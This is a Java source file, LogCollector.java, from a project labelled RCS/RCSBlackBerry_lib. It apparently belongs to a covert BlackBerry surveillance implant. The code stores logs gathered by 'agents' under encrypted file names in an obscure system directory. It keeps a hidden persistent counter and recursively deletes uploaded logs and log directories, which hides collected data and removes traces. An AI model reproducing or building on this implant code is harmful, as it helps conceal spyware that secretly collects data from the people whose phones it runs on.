/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : LogCollector.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.log;

import java.io.IOException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Vector;

import javax.microedition.io.Connector;
import javax.microedition.io.file.FileConnection;

import net.rim.device.api.system.PersistentObject;
import net.rim.device.api.system.PersistentStore;
import net.rim.device.api.util.NumberUtilities;
import blackberry.agent.Agent;
import blackberry.config.Keys;
import blackberry.crypto.Encryption;
import blackberry.fs.AutoFlashFile;
import blackberry.fs.Path;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.DoubleStringSortVector;
import blackberry.utils.StringSortVector;

// TODO: Auto-generated Javadoc
/**
 * The Class LogCollector.
 * 
 * @author user1
 *         TODO Ordinare le cartelle e i file
 */
public final class LogCollector implements Singleton {
    //#debug
    private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);

    static LogCollector instance = null;

    public static final String LOG_EXTENSION = ".mob";

    public static final String LOG_DIR_PREFIX = "Z"; // Utilizzato per creare le
    // Log Dir
    public static final String LOG_DIR_FORMAT = "Z*"; // Utilizzato nella
    // ricerca delle Log Dir
    public static final int LOG_PER_DIRECTORY = 500; // Numero massimo di log
    // per ogni directory
    public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
    // creeremo
    private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave

    // arbitraria
    // di
    // accesso

    int seed;
    
    /**
     * Decrypt name.
     * 
     * @param logMask
     *            the log mask
     * @return the string
     */
    public static String decryptName(final String logMask) {
        return Encryption.decryptName(logMask, Keys.getInstance()
                .getChallengeKey()[0]);
    }

    /**
     * Encrypt name.
     * 
     * @param logMask
     *            the log mask
     * @return the string
     */
    public static String encryptName(final String logMask) {
        return Encryption.encryptName(logMask, Keys.getInstance()
                .getChallengeKey()[0]);
    }

    /**
     * Gets the single instance of LogCollector.
     * 
     * @return single instance of LogCollector
     */
    public static synchronized LogCollector getInstance() {
        if (instance == null) {
            instance = new LogCollector();
        }

        return instance;
    }

    private static int getLogNum() {
        // TODO Auto-generated method stub
        return 0;
    }

    // public boolean storeToMMC;
    Vector logVector;

    private int logProgressive;

    private PersistentObject logProgressivePersistent;

    Keys keys;

    /**
     * Instantiates a new log collector.
     */
    private LogCollector() {
        super();
        logVector = new Vector();

        logProgressive = deserializeProgressive();
        keys = Keys.getInstance();
        seed = keys.getChallengeKey()[0];
    }

    private void clear() {
        // TODO Auto-generated method stub

    }

    public synchronized void removeProgressive() {
        //#debug info
        debug.info("Removing Progressive");
        PersistentStore.destroyPersistentObject(PERSISTENCE_KEY);
    }

    private synchronized int deserializeProgressive() {
        logProgressivePersistent = PersistentStore
                .getPersistentObject(PERSISTENCE_KEY);
        final Object obj = logProgressivePersistent.getContents();

        if (obj == null) {
            // #debug info
            debug.info("First time of logProgressivePersistent");
            logProgressivePersistent.setContents(new Integer(1));
        }

        final int logProgressiveRet = ((Integer) logProgressivePersistent
                .getContents()).intValue();
        return logProgressiveRet;
    }

    /**
     * Factory.
     * 
     * @param agent
     *            the agent
     * @param onSD
     *            the on sd
     * @return the log
     */
    public synchronized Log factory(final Agent agent, final boolean onSD) {
        if (getLogNum() > MAX_LOG_NUM) {
            // #debug
            debug.error("Max log reached");
            return null;
        }

        final Log log = new Log(agent, keys.getAesKey());

        return log;
    }

    /**
     * Gets the logs.
     * 
     * @param basePath
     *            the base path
     * @return the logs
     */
    public Vector getLogs2(final String basePath) {
        final Vector allLogs = new Vector();

        final Vector dirs = scanForDirLogs(basePath);
        final int size = dirs.size();
        for (int i = 0; i < size; ++i) {
            final String dir = (String) dirs.elementAt(i);
            final Vector logs = scanForLogs(basePath, dir);
            allLogs.addElement(logs);
        }

        return allLogs;
    }

    /*
     * private String MakeDateDir(Date date, int progressive) { long millis =
     * date.getTime(); long mask = (long) 1E4; int lodate = (int) (millis %
     * mask); int hidate = (int) (millis / mask); Calendar calendar =
     * Calendar.getInstance(); calendar.setTime(date); int year =
     * calendar.get(Calendar.YEAR); int month = calendar.get(Calendar.MONTH);
     * int day = calendar.get(Calendar.DAY_OF_MONTH); int hour =
     * calendar.get(Calendar.HOUR); int minute = calendar.get(Calendar.MINUTE);
     * int second = calendar.get(Calendar.SECOND); String newname =
     * NumberUtilities.toString(millis, 16, 6);
     * //NumberUtilities.toString(lodate, 16, 8)+
     * //NumberUtilities.toString(hidate, 16, 8); return newname; }
     */

    /**
     * Gets the new progressive.
     * 
     * @return the new progressive
     */
    protected synchronized int getNewProgressive() {
        logProgressive++;
        logProgressivePersistent.setContents(new Integer(logProgressive));

        // #debug debug
        debug.trace("Progressive: " + logProgressive);
        return logProgressive;
    }

    private static String makeDateName(final Date date) {
        final long millis = date.getTime();
        final long mask = (long) 1E4;
        final int lodate = (int) (millis % mask);
        final int hidate = (int) (millis / mask);

        final String newname = NumberUtilities.toString(lodate, 16, 8)
                + NumberUtilities.toString(hidate, 16, 8);

        return newname;
    }

    /**
     * Make new name.
     * 
     * @param log
     *            the log
     * @param agent
     *            the agent
     * @return the vector
     */
    public synchronized Vector makeNewName(final Log log, final Agent agent) {

        final boolean onSD = agent.onSD();
        final Date timestamp = log.timestamp;
        final int progressive = getNewProgressive();

        final Vector vector = new Vector();
        final String basePath = onSD ? Path.SD_PATH : Path.USER_PATH;

        final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
        final String fileName = progressive + "!" + makeDateName(timestamp);

        final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
                seed);

        //#ifdef DBC
        Check.asserts(!encName.endsWith("MOB"), "makeNewName: " + encName
                + " ch: " + seed 
                + " not scrambled: " + fileName + LOG_EXTENSION);
        //#endif

        vector.addElement(new Integer(progressive));
        vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
        vector.addElement(blockDir); // 1
        vector.addElement(encName); // ?
        vector.addElement(fileName); // unencrypted file
        return vector;
    }

    /**
     * Removes the.
     * 
     * @param logName
     *            the log name
     */
    public void remove(final String logName) {
        // #debug debug
        debug.trace("Removing file: " + logName);
        final AutoFlashFile file = new AutoFlashFile(logName, false);
        if (file.exists()) {
            file.delete();
        } else {
            // #debug
            debug.warn("File doesn't exists: " + logName);
        }
    }

    /**
     * Rimuove i file uploadati e le directory dei log dal sistema e dalla MMC.
     */

    public synchronized void removeLogDirs() {
        //#debug info
        debug.info("removeLogDirs");
        removeLogRecursive(Path.SD_PATH, false);
        removeLogRecursive(Path.USER_PATH, false);
    }

    private void removeLogRecursive(String basePath, boolean delete) {

        //#debug info
        debug.info("RemovingLog: " + basePath);

        FileConnection fc;
        try {
            fc = (FileConnection) Connector.open(basePath);

            if (fc.isDirectory()) {
                final Enumeration fileLogs = fc.list("*", true);

                while (fileLogs.hasMoreElements()) {
                    final String file = (String) fileLogs.nextElement();

                    //#debug debug
                    debug.trace("removeLog: " + file);
                    removeLogRecursive(basePath + file, true);
                }
            }

            if (delete) {
                fc.delete();
            }

            fc.close();

        } catch (final IOException e) {
            //#debug error
            debug.error("removeLog: " + basePath + " ex: " + e);
        }

    }

    /**
     * Restituisce la lista ordinata secondo il nome.
     * 
     * @param currentPath
     *            the current path
     * @return the vector
     */
    public Vector scanForDirLogs(final String currentPath) {
        // #ifdef DBC
        Check.requires(currentPath != null, "null argument");
        // #endif

        final StringSortVector vector = new StringSortVector();
        FileConnection fc;

        try {
            fc = (FileConnection) Connector.open(currentPath);

            if (fc.isDirectory()) {
                final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
                        true);

                while (fileLogs.hasMoreElements()) {
                    final String dir = (String) fileLogs.nextElement();
                    // scanForLogs(dir);
                    // return scanForLogs(file);
                    vector.addElement(dir);
                    //#debug debug
                    debug.trace("scanForDirLogs adding: " + dir);

                }

                vector.reSort();
            }

            fc.close();

        } catch (final IOException e) {
            //#debug error
            debug.error("scanForDirLogs: " + e);

        }

        //#debug debug
        debug.trace("scanForDirLogs #: " + vector.size());

        return vector;
    }

    /**
     * Estrae la lista di log nella forma *.MOB dentro la directory specificata
     * da currentPath, nella forma 1_n
     * Restituisce la lista ordinata secondo il nome demangled
     * 
     * @param currentPath
     *            the current path
     * @param dir
     *            the dir
     * @return the vector
     */
    public Vector scanForLogs(final String currentPath, final String dir) {
        // #ifdef DBC
        Check.requires(currentPath != null, "null argument");
        // #endif

        final DoubleStringSortVector vector = new DoubleStringSortVector();

        FileConnection fcDir = null;
        // FileConnection fcFile = null;
        try {
            fcDir = (FileConnection) Connector.open(currentPath + dir);
            final Enumeration fileLogs = fcDir.list("*", true);

            while (fileLogs.hasMoreElements()) {
                final String file = (String) fileLogs.nextElement();

                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
                // file);
                // e' un file, vediamo se e' un file nostro
                final String logMask = LogCollector.LOG_EXTENSION;
                final String encLogMask = encryptName(logMask);

                if (file.endsWith(encLogMask)) {
                    // String encName = fcFile.getName();
                    // #debug debug
                    debug.trace("enc name: " + file);
                    final String plainName = decryptName(file);
                    // #debug debug
                    debug.trace("plain name: " + plainName);

                    vector.addElement(plainName, file);
                }
            }

        } catch (final IOException e) {
            //#debug error
            debug.error("scanForLogs: " + e);

        } finally {
            if (fcDir != null) {
                try {
                    fcDir.close();
                } catch (final IOException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }
            }
        }

        //#debug debug
        debug.trace("scanForLogs numDirs: " + vector.size());
        return vector.getValues();
    }

    //
    /**
     * Scan logs.
     */
    public void scanLogs() {
        clear();

        if(Path.isSDPresent() && Path.makeDirs(Path.SD)){
            //#debug info
            debug.info("SD available and writable");
        }else{
            //#debug warn
            debug.warn("SD is not available or writable");
            Path.SD_PATH = Path.USER_PATH;
        }
        
        Path.makeDirs(Path.USER);
    }

}
